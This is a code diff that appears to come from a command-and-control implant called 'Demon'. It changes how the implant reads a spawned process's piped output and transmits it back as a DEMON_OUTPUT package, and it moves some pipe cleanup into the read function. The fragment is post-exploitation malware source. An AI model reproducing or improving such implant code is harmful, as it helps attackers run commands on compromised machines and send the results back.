@@ -422,24 +422,14 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
     }
 
     if ( Piped )
-    {
-        PUTS( "Piped enabled" )
-        Instance.Win32.NtClose( AnonPipe->StdOutWrite );
-        AnonPipe->StdOutWrite = NULL;
-
         JobAdd( ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
-    }
 
 Cleanup:
-    PUTS( "Process cleanup" )
     if ( CommandLineW )
     {
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
         Instance.Win32.LocalFree( CommandLineW );
     }
-
-    PackageDestroy( Package );
-    AnonPipesClose( &AnonPipe );
 
     return Return;
 }
@@ -551,15 +541,21 @@ HandleError:
 
 VOID AnonPipesRead( PANONPIPE AnonPipes )
 {
-    PPACKAGE Package         = PackageCreate( DEMON_OUTPUT );
+    PPACKAGE Package         = NULL;
     BOOL     Success         = FALSE;
     LPVOID   Buffer          = NULL;
-    UCHAR    buf[ 1025 ]     = { 0 };
+    UCHAR    buf[ 1024 ]     = { 0 };
     DWORD    dwBufferSize    = 0;
     DWORD    dwRead          = 0;
 
     PUTS( "Start reading anon pipe" )
     PRINTF( "AnonPipes->StdOutRead => %x\n", AnonPipes->StdOutRead )
+
+    if ( AnonPipes->StdOutWrite )
+    {
+        Instance.Win32.NtClose( AnonPipes->StdOutWrite );
+        AnonPipes->StdOutWrite = NULL;
+    }
 
     Buffer = Instance.Win32.LocalAlloc( LPTR, 0 );
     do
@@ -570,21 +566,24 @@ VOID AnonPipesRead( PANONPIPE AnonPipes )
         if ( dwRead == 0 )
             break;
 
+        dwBufferSize += dwRead;
+
         Buffer = Instance.Win32.LocalReAlloc(
                 Buffer,
-                dwBufferSize + dwRead,
-                LMEM_MOVEABLE | LMEM_ZEROINIT
-        );
-
-        dwBufferSize += dwRead;
+                dwBufferSize,
+                LMEM_MOVEABLE);
 
         MemCopy( Buffer + ( dwBufferSize - dwRead ), buf, dwRead );
         MemSet( buf, 0, dwRead );
 
     } while ( Success == TRUE );
 
-    PackageAddBytes( Package, Buffer, dwBufferSize );
-    PackageTransmit( Package, NULL, NULL );
+    if ( dwBufferSize )
+    {
+        Package = PackageCreate( DEMON_OUTPUT );
+        PackageAddBytes( Package, Buffer, dwBufferSize );
+        PackageTransmit( Package, NULL, NULL );
+    }
 
     DATA_FREE( Buffer, dwBufferSize );
 }
